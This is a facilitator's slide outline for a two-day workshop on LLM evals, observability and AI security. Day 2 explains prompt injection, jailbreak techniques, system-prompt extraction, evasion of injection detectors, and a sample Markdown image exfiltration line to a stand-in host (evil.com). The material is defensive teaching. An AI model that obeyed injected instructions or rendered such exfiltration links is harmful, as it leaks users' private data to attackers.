# Slide Outlines & Facilitator Notes: Production AI Engineering

**Format:** 2 × 3.5-hour Half-Day Sessions  
**Stack:** Python 3.11+, Langfuse (OpenTelemetry), Promptfoo + `pytest`, Microsoft Presidio, Garak  
**Audience:** Software & AI Engineers building production LLM applications  
**Tools and standards as of:** November 2026

---

## Day 1: AI Evals, Observability & Monitoring (3.5 Hours)

### Opening & Framing (5 min, part of the Unit 1.1 block)
- **Slide 1: Title & Workshop Outcomes**
  - *Visual:* Two-day roadmap diagram (`Day 1: Measure & Observe` → `Day 2: Defend & Govern`).
  - *Bullets:* Stop vibe-checking prompts; build calibrated evals, full-stack traces, and CI regression gates.
  - *Facilitator Note:* Ask the room: *"How many of you have changed one sentence in a system prompt, eyeballed 3 outputs, shipped it, and later found out it broke a different workflow?"* Use the show of hands to anchor why this workshop exists.

---

### Unit 1.1: Why Traditional Testing Fails & Evaluation Foundations (35 min lecture + 35 min Lab 1)

- **Slide 2: Why `assert output == expected` Breaks for AI**
  - *Bullets:*
    - Stochastic outputs: same input, different valid phrasing.
    - Unbounded input space: users invent phrasing, languages, and edge cases you cannot enumerate.
    - Silent regressions: upstream model changes (an alias that starts pointing at a newer snapshot, a retired model you must migrate off), chunking tweaks, or prompt edits degrade quality without raising exceptions.
  - *Facilitator Note:* Emphasize that **unit tests still matter**—just not for semantic equivalence. Keep deterministic assertions for schemas, tool signatures, and latency/token budgets.

- **Slide 3: The AI Evaluation Pyramid**
  - *Visual:* 4-tier pyramid from bottom (fast/cheap) to top (slow/expensive):
    1. **Deterministic Code Checks** (`pydantic`, JSON schema, regex, tool-arg types, cost/latency caps)
    2. **Retrieval & Reference Metrics** (Recall@k, MRR, NDCG for RAG)
    3. **LLM-as-a-Judge** (semantic faithfulness, tone, policy adherence)
    4. **Human Review** (bootstrapping Golden Datasets & calibrating judges)
  - *Facilitator Note:* Common misconception: "We need LLM-as-a-Judge for everything." Push back: if a regex or Pydantic validator can catch it in 1ms for $0, never pay an LLM to grade it.

- **Slide 4: Failure Analysis First (Open & Axial Coding)**
  - *Bullets:*
    - Don't invent metrics in a vacuum—read 50–100 raw traces first.
    - **Open coding:** Write freeform notes on every bad trace (e.g., *"invented refund deadline"*, *"ignored negative constraint"*).
    - **Axial coding:** Cluster notes into 4–8 concrete failure modes; rank by `frequency × severity`.
    - Map each top failure mode to one focused Pass/Fail evaluator, with its own human label.
  - *Facilitator Note:* Engineers often want to jump straight to off-the-shelf 1–5 "helpfulness" scores. Explain why generic scores hide actionable bugs—domain-specific binary checks tell you *what* to fix.

- **Slide 5: Building a Golden Dataset**
  - *Bullets:*
    - Start with 30–100 high-signal rows, not 10,000 synthetic rows.
    - Sources: production thumbs-down logs, support escalations, edge-case taxonomy, adversarial seeds.
    - Stratify by intent, difficulty, and risk tier (low-stakes FAQ vs. state-mutating tool calls).
    - Include questions the documents do not answer: the correct output is an abstention.
    - Version datasets in Git or Langfuse alongside prompts; pseudonymize production traces before promoting them.
  - *Facilitator Note:* Remind participants that a Golden Dataset is a living test suite—every production bug should become a new row. Rows built from production traces hold personal data, so plan how to delete a person's rows, including from Git history.

- **Slide 6: LLM-as-a-Judge: Design & Calibration**
  - *Bullets:*
    - Prefer **binary Pass/Fail** over 1–5 Likert scales.
    - Force **reasoning/critique before the verdict** in structured JSON output.
    - Known biases: *position bias* (A/B order), *verbosity bias* (longer = better), *self-preference*.
    - **Calibration rule:** Measure judge precision/recall against a human-labeled validation split before trusting it in CI. Report intervals: 7 of 8 failures caught is a recall somewhere between ~53% and ~98%.
  - *Facilitator Note:* Highlight a practical trick: use a stronger/different model family as the judge than the generator during calibration, then distill to a faster judge only if agreement holds. Before comparing the judge with humans, check that the humans agree with each other.

- **Slide 7: Lab 1 Briefing — Failure Analysis & Calibrated Judge (35 min)**
  - *Bullets:*
    - Read the 20 dev traces and find the top failure modes (open → axial coding) before looking at the labels.
    - Read the deterministic format/citation checks.
    - Run the 1–5 baseline, then write a binary faithfulness judge and iterate on dev.
    - Measure once on the 20 val traces: precision/recall against the faithfulness label, with intervals and κ.
  - *Facilitator Note:*
    - Walk around at minute 15 to check that teams aren't writing vague judge prompts like *"Rate 1-5 if this is good."*
    - Debrief for 5 min:
      - Which errors did the 1–5 baseline make? Look for correct abstentions marked bad and fluent inventions marked good.
      - What does the binary judge still miss?
      - How wide is the interval on val?
    - Don't promise a number in advance: live results vary with the model and the run. `--mock` works without an API key, but it is a crude heuristic, not a target.

---

### Break (15 min)

---

### Unit 1.2: Observability, Monitoring & Platform Landscape (35 min lecture + 25 min Lab 2)

- **Slide 8: Anatomy of an LLM Trace**
  - *Visual:* Span waterfall: `request` → `query_rewrite` → `vector_search` → `rerank` → `llm_generate` → `tool_call` → `final_response`.
  - *Bullets:*
    - Required attributes: `model`, `prompt_version`, `tokens_in/out/cached`, `TTFT`, `total_latency`, `cost_usd`, `retrieved_doc_ids`, `session_id`.
    - Why **OpenTelemetry (GenAI Semantic Conventions)** matters: instrument once, swap backends later. Pin the convention version: attribute names still change.
  - *Facilitator Note:* Stress `prompt_version` and `commit_sha` on every trace. Without version tags, a spike in errors after a deploy is impossible to bisect.

- **Slide 9: Online Monitoring vs. Offline Evals**
  - *Bullets:*
    - **System Health:** TTFT, P95/P99 latency, token burn per tenant/feature, 429 rate-limits, fallback triggers.
    - **Behavioral Signals:** Re-prompting, copy/abandonment, explicit feedback, empty-retrieval rate, JSON parse failures.
    - **Drift Detection:** Input length shifts, topic/embedding drift, sudden refusal spikes after provider updates.
    - **Trace Hygiene:** Traces hold prompts, documents and user data: mask before export, set retention.
  - *Facilitator Note:* Ask: *"How many alerts do you have for HTTP 500s vs. alerts for 'the LLM returned valid 200 OK JSON that says I cannot help with that'?"*

- **Slide 10: Platform Landscape & Selection Matrix (November 2026)**
  - *Table/Bullets:*
    - **Open-Source / Self-Hostable:** *Langfuse* (tracing + prompt management + datasets + evals; owned by ClickHouse since January 2026, core still MIT), *Arize Phoenix* (OTel-native, embedding/RAG inspection; Arize acquired by Dynatrace in 2026, Phoenix still open source), *Opik* (experiments + tracing).
    - **Managed / Eval-First:** *Braintrust* (tight playground-to-CI loop), *LangSmith* (LangChain/LangGraph native).
    - **Code-First CLI Runners:** *Promptfoo* (OpenAI announced its acquisition in March 2026; stays open source), *DeepEval*, *Ragas*, *Inspect AI* (fast local & CI execution).
    - **Consolidation:** Helicone, a lightweight proxy that used to be on this slide, was bought by Mintlify in March 2026 and is in maintenance mode.
  - *Facilitator Note:*
    - Frame our workshop choice (**Langfuse + Promptfoo/pytest**): teams get full data-residency control with Langfuse and Git-native CI ergonomics with Promptfoo/pytest.
    - Then make the 2026 point: three tools on this slide changed hands this year. That is why the labs emit OpenTelemetry attributes and keep the gate logic in `pytest`: the part you own outlives the vendor.
    - Say plainly that the red-teaming tool we use on Day 2 now belongs to a model vendor.

- **Slide 11: Lab 2 Briefing — Tracing & Bottleneck Diagnosis (25 min)**
  - *Bullets:*
    - Read one trace and a 10-request run (P50/P95 per step).
    - Add `prompt_version`, `retrieval_k`, `user_tier`, and attach the user's thumbs-up afterwards, by trace ID.
    - Fix: parallel tools with one child span each, then retrieve 20 → rerank → keep 4, watching `retrieval_hit`.
  - *Facilitator Note:*
    - The planted bottlenecks: sequential tool calls, a billing dependency that is slow on every 10th request (visible only in P95), and the bloated `k=20` context.
    - If someone cuts `k` to 4, ask them to check `retrieval_hit`: the answer ranks 7th.
    - Close with the open question from the README: after the fix, P95 is still set by the slow call. What would they do?

---

### Unit 1.3: Production Eval Loops & CI/CD Integration (30 min lecture + 30 min Lab 3)

- **Slide 12: The Continuous Eval Flywheel**
  - *Visual:* Loop diagram: `Production Traffic` → `Online Scorers & User Feedback` → `Triage` → `Golden Dataset` → `CI/CD Gate` → `Canary Deploy`.
  - *Bullets:* Production failures become permanent regression tests; CI prevents shipping the same bug twice.
  - *Facilitator Note:* Emphasize ownership: engineers own the Golden Dataset just like they own unit tests—it is not "someone else's QA job."

- **Slide 13: CI/CD Gating Without Blowing Your Budget**
  - *Bullets:*
    - **PR Gate (<2 min):** Deterministic `pytest` checks + 25–50 high-signal smoke cases in `promptfoo` using a fast judge.
    - **Nightly / Pre-Release:** Full Golden Dataset (500+ rows), multi-turn simulations, and model-upgrade benchmarks.
    - **Variance Control:** Run paired comparisons (`baseline` vs. `candidate` on identical inputs) with confidence intervals rather than reacting to 1-row flake. For reliability, require `pass^k` (the case passes in all k runs, as in τ-bench), not `pass@k`, which rewards a prompt that only sometimes works.
    - **Per-Slice Gates:** An aggregate pass rate can hide a slice that went from 2/2 to 0/2.
  - *Facilitator Note:* Address the #1 objection: *"Running LLM evals in CI is too slow and expensive."* Show how tiering PR vs. Nightly keeps PR feedback under 2 minutes and pennies per run.

- **Slide 14: Safe Rollouts — Shadow, Canary & Rollback**
  - *Bullets:*
    - **Shadow mode:** Replay live traffic asynchronously against new prompt/model; score offline. Stub every side effect: a shadow agent must never send the email.
    - **Canary (5% traffic):** Automated rollback on JSON parse failures, guardrail triggers, or P95 latency regressions. These signals do not see worse answers, so also compare judge scores on sampled canary and control traffic.
    - **Prompt Decoupling:** Store prompts versioned in Langfuse or config so emergency rollbacks don't require a full container rebuild.
  - *Facilitator Note:* Wrap up Day 1 by connecting observability to safety: tomorrow we'll look at what happens when the inputs aren't just noisy—they're adversarial.

- **Slide 15: Lab 3 Briefing — CI Regression Gate (30 min)**
  - *Bullets:*
    - A PR "only makes the assistant friendlier": JSON and citations stay, but it fills gaps with general knowledge.
    - Run the gate: schema validity 100%, overall bar passed, yet the paired per-slice comparison fails (`not_covered` 2/2 → 0/2).
    - Fix the candidate.
  - *Facilitator Note:*
    - Show the diff report of flipped cases on the projector so everyone sees how a PR reviewer reads an eval failure.
    - Ask why the 90% overall bar passed, and what a 2-row slice can prove: its interval is 34–100% even at 2/2.
    - Offline, the gate replays recorded outputs keyed by the prompt's hash and fails closed on an edited prompt. A fixed prompt needs `LIVE_EVAL=1` or the reference fix.

---

## Day 2: AI Security & Safety (3.5 Hours)

### Opening & Day 1 Recap (5 min, part of the Unit 2.1 block)
- **Slide 16: Day 2 Framing — From Reliability to Adversarial Resilience**
  - *Bullets:* Day 1 caught accidental regressions; Day 2 defends against intentional attacks, data leaks, and unsafe agent actions.
  - *Facilitator Note:* Connect the two days: every security failure discovered today becomes a new regression test, in Lab 6 as a replay of the attack through the whole system.

---

### Unit 2.1: Understanding the AI Threat Surface (20 min lecture + 20 min Lab 4)

- **Slide 17: The Root Cause — Conflating Data and Instructions**
  - *Bullets:*
    - LLMs process system prompts, user input, RAG chunks, and tool outputs in **one shared token stream**.
    - No hardware-enforced privilege ring (unlike SQL parameterized queries or OS kernel/user space).
    - Any untrusted text entering the context window is a potential control-plane hijack.
  - *Facilitator Note:* Use the SQL injection analogy: before parameterized queries, concatenating strings mixed code and data. With LLMs, *everything* in the context window is still concatenated text—so defense must happen at the architecture and tool boundaries.

- **Slide 18: The 5 Trust Boundaries (OWASP LLM Top 10 2026 + Agentic Top 10 2026)**
  - *Bullets:*
    1. **Input Boundary:** Direct prompt injection, jailbreaks, encoding smuggling.
    2. **Retrieval / RAG Boundary:** Indirect injection, corpus poisoning, cross-tenant ACL leaks.
    3. **Tool / Agentic Boundary:** Excessive agency, SSRF/SQLi via LLM args, confused-deputy actions (a shared service-account token instead of the user's delegated token).
    4. **Output Boundary:** Markdown/XSS injection, insecure output handling, slopsquatting.
    5. **Data & Supply Chain:** Logging leaks, ZDR gaps, malicious MCP servers/plugins (tool poisoning in tool descriptions, rug pulls after approval, token passthrough).
  - *Facilitator Note:*
    - Keep OWASP practical—tie each boundary to a concrete failure engineers recognize from web/backend security.
    - Say which edition you use. The 2026 list (published 4 August 2026) renumbered entries again: Excessive Agency moved up to LLM03, Improper Output Handling down to LLM10, and System Prompt Leakage was broadened into LLM08 Hidden Context Exposure. Older material maps differently.
    - For agents, add the OWASP Top 10 for Agentic Applications (December 2025, ASI01–ASI10), e.g. ASI01 Agent Goal Hijack, ASI02 Tool Misuse, ASI03 Identity & Privilege Abuse.

- **Slide 19: Two Mental Models — Lethal Trifecta & Agents Rule of Two**
  - *Visual:* Left, the trifecta triangle: `(1) Private Data Access` + `(2) Untrusted Content Exposure` + `(3) External Communication`. Right, the Rule of Two: `[A] untrusted input`, `[B] sensitive systems or private data`, `[C] change state or communicate externally`, with "pick at most two" above.
  - *Bullets:*
    - **Trifecta (Simon Willison, 2025), for confidentiality:** all three together = silent data exfiltration. Cut a leg, usually the outbound channel (no arbitrary URLs/images, egress allowlist).
    - **Rule of Two (Meta, October 2025), for any harmful action:** in one session, at most two of [A], [B], [C]. If a task needs all three, the agent must not act autonomously: require human approval or another reliable check, or start a fresh session.
    - The trifecta misses an injected `delete_workspace`: it needs no private data, only untrusted input and the power to change a sensitive system.
  - *Facilitator Note:*
    - Use the trifecta for "can data get out?" and the Rule of Two for "can anything harmful happen?". Revisit both whenever someone proposes giving an autonomous agent email/Slack/HTTP write tools.
    - Anchor: in May 2025 Invariant Labs showed a malicious public GitHub issue making an agent with the GitHub MCP server leak private-repository data into a public pull request.

- **Slide 20: Lab 4 Briefing — Threat Modeling an Agentic App (20 min)**
  - *Bullets:*
    - Use the architecture diagram: Slack bot with Slack Connect, Confluence RAG, Jira/Email write tools, a shared service-account token, SaaS observability.
    - Map sources, assets and sinks.
    - Document 3 concrete attack paths ranked by `impact × likelihood`. Map each to OWASP LLM 2026 and Agentic 2026, with a mitigation that does not rely on the model.
  - *Facilitator Note:* Pair engineers up for 12 minutes, then spend 8 minutes collecting the top attack paths on the whiteboard. If nobody finds the confused deputy, the channel-wide audience or the HR data in traces, ask the identity, audience and logging questions from the worksheet.

---

### Unit 2.2: Attacks, Hallucinations & Data Privacy / PII Protection (35 min lecture + 40 min Lab 5)

- **Slide 21: Prompt Injection & Output Exfiltration Patterns**
  - *Bullets:*
    - **Direct:** Persona framing, delimiter escaping, Base64/homoglyphs, multi-turn crescendo.
    - **Indirect:** Hidden text in HTML/PDFs, poisoned support tickets, malicious tool responses.
    - **System Prompt Extraction:** Never store API keys, DB strings, or secret business rules in system prompts.
    - **Zero-Click Exfiltration:** LLM renders `![x](https://evil.com/leak?data=SECRET)` in Markdown UI. A link needs one click; in Slack, link unfurling fetches it with none.
  - *Facilitator Note:* Live-demo or show a concrete Markdown image exfiltration example—engineers are consistently surprised that a read-only chatbot can exfiltrate data via a rendered image tag. Anchor: EchoLeak (CVE-2025-32711, disclosed June 2025): one crafted email could make Microsoft 365 Copilot exfiltrate data with no user interaction.

- **Slide 22: Hallucinations as a Security & Business Risk**
  - *Bullets:*
    - **Slopsquatting:** Attackers register frequently hallucinated PyPI/npm package names.
    - **Unauthorized Commitments:** Bots inventing discounts, SLAs, or legal terms.
    - **Mitigations:** Strict grounding, citation verification, `enum`/schema-constrained outputs, and deterministic business-rule checks *outside* the LLM.
  - *Facilitator Note:* Reinforce: never let the LLM be the final authority on pricing, permissions, or eligibility. Anchor: in Moffatt v. Air Canada (2024), the airline was held liable for a bereavement-fare policy its chatbot invented.

- **Slide 23: Data Privacy, PII & RAG Access Control**
  - *Bullets:*
    - **Pre-LLM Redaction (Microsoft Presidio):** Detect and mask PII/secrets with numbered placeholders (`<PERSON_1>`, `<EMAIL_ADDRESS_1>`) *before* calling external model APIs. Re-hydrate locally, after output sanitization, and never into a URL: the client fetches even allowlisted URLs.
    - **Observability Hygiene:** Scrub PII/tokens before sending spans to Langfuse/OTel; set retention TTLs.
    - **Vector DB ACLs:** Enforce tenant/user permissions as mandatory metadata filters *inside* the retrieval query—never in the system prompt. The identity comes from the verified session, never from the request or the model.
    - **Vendor Controls:** Zero Data Retention (ZDR), no-training agreements, regional endpoints.
  - *Facilitator Note:*
    - Emphasize the RAG ACL rule: *"If a document is in the prompt, it is already too late for access control."*
    - Presidio is best-effort NER, so measure its recall on your data. It ships recognizers for other locales (e.g. the Polish PESEL), but the lab loads only the English ones.
    - Under GDPR, personal data in prompts, traces and golden datasets needs a legal basis and a deletion path (take-home appendix).

- **Slide 24: Lab 5 Briefing — Attack & Harden (40 min)**
  - *Bullets:*
    - *Part A (Attack, 15 min):* Three scenarios with server-side sessions.
      - An intern pulls HR-confidential salary data.
      - Another customer's contract leaks across tenants.
      - A keyword-stuffed vendor page triggers email exfiltration plus Markdown image and link exfiltration.
    - *Part B (Defend, 25 min):*
      - Tenant and clearance filters based on the session's principal.
      - Presidio redaction with numbered, reversible placeholders.
      - A role check plus a recipient allowlist in the tool wrapper.
      - Removal of external images and links.
  - *Facilitator Note:* Keep Part A time-boxed to 15 min so everyone has plenty of time to implement the defenses in Part B. In the debrief, point out that the simulated model follows the injection in both versions. For the HR manager, who may read salaries and send email, only the recipient allowlist stops the leak.

---

### Break (15 min)

---

### Unit 2.3: Guardrails, Runtime Checks, Red Teaming & Governance (25 min lecture + 30 min Lab 6 + 20 min governance & wrap-up)

- **Slide 25: Defense-in-Depth Runtime Guardrails**
  - *Visual:* 4-stage pipeline: `Input Checks` → `Retrieval ACLs` → `Tool Policy & HITL` → `Output Checks`, with a label across the input stage: "signal", and across the tool stage: "boundary".
  - *Bullets:*
    - **Input:** Rate/length limits, topic allowlists, and injection detection (heuristics, or classifiers such as Llama Prompt Guard 2, Lakera Guard, Azure Prompt Shields). Llama Guard is a content-safety classifier, not an injection detector.
    - **Detection is a signal, not a boundary:** in "The Attacker Moves Second" (2025), adaptive attacks broke 12 published defenses, mostly with success rates above 90%. Use detectors to cut noise, quarantine content and feed telemetry.
    - **Retrieval:** ACL filters in the query; delimit untrusted content (spotlighting), which lowers the success of static attacks, not adaptive ones.
    - **Tool Execution (the boundary):**
      - Object-level authorization on every call, with the user's delegated, least-privilege token.
      - Strict Pydantic arg validation and egress allowlists.
      - **Human-in-the-Loop (HITL)** for destructive/external writes, after authorization: HITL is not authorization, and approval fatigue makes it a rubber stamp.
    - **Output:** PII leak scan, toxicity/policy check, groundedness check.
    - **Latency Budget:** Run fast deterministic/small-model checks synchronously; run heavy checks async or on high-risk actions only.
  - *Facilitator Note:* Warn against stacking 5 synchronous LLM guardrail calls—users will abandon a 12-second chatbot. Then ask: *"If your injection classifier misses one request in a hundred, what does that one request get to do?"* The answer should be decided by the tool policy, not by the classifier.

- **Slide 26: Automated Red Teaming (`garak` & `promptfoo redteam`)**
  - *Bullets:*
    - Treat AI red teaming like automated fuzzing + pentesting.
    - Attack categories: jailbreaks, PII extraction, indirect injection, excessive agency, cross-tenant object access, off-topic/brand manipulation.
    - **Read it like an eval:**
      - Pre-generate the attacks, so runs are comparable.
      - The grader is an LLM judge: calibrate it (grader examples) and read every failure.
      - Five probes per plugin are a search, not a measurement: 0/5 still allows a ~43% failure rate.
    - **Close the loop:** Every confirmed exploit becomes a permanent CI test that replays the attack through the real system with the model's replies scripted. A unit test of one guardrail function is not enough.
  - *Facilitator Note:* Show how `garak` probes broad model weaknesses (it does not go through your guardrails) while `promptfoo redteam` excels at app-specific, CI-integrated adversarial suites. Mention that OpenAI announced the acquisition of Promptfoo in March 2026: know who owns the tool that grades your vendor's model.

- **Slide 27: Lab 6 Briefing — Guardrails & Red Teaming (30 min)**
  - *Bullets:*
    - *Part A (10 min):* Turn two findings into failing replay tests: an indirect injection from the shared help center under approval fatigue, and another organization's invoice.
    - *Part B (10 min):* Close `check_tool_policy` with object-level authorization and a per-organization recipient allowlist.
    - *Part C (10 min):* Run pre-generated `promptfoo redteam` attacks against the starter and the solution, and read the grader's verdicts against the tool log.
  - *Facilitator Note:*
    - Generate `redteam.yaml` days before the workshop and read the attacks. Run Part C on the projector if participants have no API key.
    - In the debrief, show the Polish paraphrase passing the English-only tripwire.
    - Then show the limit of the solution: with `REDTEAM_HITL_APPROVED=1`, an injected `rotate_all_keys` from an admin would still run. Untrusted input plus a state change is the case the Rule of Two is about.

- **Slide 28: Governance & Production Readiness**
  - *Bullets:*
    - **Inventory & Data Flow:** Document models, ZDR status, data classification, and third-party MCP servers/tools (pinned tool definitions).
    - **Incident Response:** Feature-flag kill switches for tools, instant prompt rollback, provider fallback, and safe degraded responses.
    - **EU AI Act after the Digital Omnibus** (Regulation (EU) 2026/1744, in force since 27 July 2026):
      - Article 50 transparency applies from 2 August 2026. Building your own bot usually makes you its provider: disclose AI interaction, mark synthetic content.
      - High-risk obligations move to 2 December 2027 (Annex III) and 2 August 2028 (Annex I).
      - Article 4 asks for measures that support AI literacy.
    - **GDPR & Audit:** DPIA where the risk is high, retention and a deletion path for traces and eval data, immutable logs of agentic tool calls, NIST AI RMF / ISO/IEC 42001.
  - *Facilitator Note:*
    - Ask teams: *"If your agent starts sending bad emails at 2 AM, how many seconds does it take to disable that tool without redeploying?"*
    - In the final wrap-up, walk through the **Production Readiness Checklist** in [curriculum.md](./curriculum.md) and ask each participant to name one gap in their current production system they will fix first.
    - Point to the [take-home appendix](./appendix_take_home.md) for what the 7 hours could not cover.
